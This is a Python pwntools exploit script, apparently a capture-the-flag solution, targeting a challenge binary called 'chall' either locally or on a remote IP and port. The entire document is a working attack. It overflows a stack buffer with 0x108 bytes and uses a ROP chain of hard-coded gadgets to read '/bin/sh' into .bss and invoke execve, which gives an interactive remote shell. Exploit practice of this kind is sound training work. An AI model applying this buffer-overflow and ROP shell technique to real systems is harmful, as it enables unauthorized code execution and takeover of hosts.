#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./chall')
else:
    s = remote('13.231.207.73', 9010)

elf = ELF('./chall')

pop_rdi = 0x40141c
pop_rsi_r15 = 0x40141a
pop_rdx = 0x4023f5
pop_rax = 0x400121
syscall = 0x4024dd

payload = ''
payload += 'A' * 0x108

# read(0, bss, 0x100)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(elf.bss()) + p64(0)
payload += p64(pop_rdx) + p64(0x100)
payload += p64(pop_rax) + p64(0)
payload += p64(syscall)

# execve("/bin/sh", NULL, NULL)
payload += p64(pop_rdi) + p64(elf.bss())
payload += p64(pop_rsi_r15) + p64(0) * 2
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(syscall)

s.sendlineafter('name?\n', payload)
time.sleep(0.1)
s.send("/bin/sh\0")
s.recvline()

s.interactive()
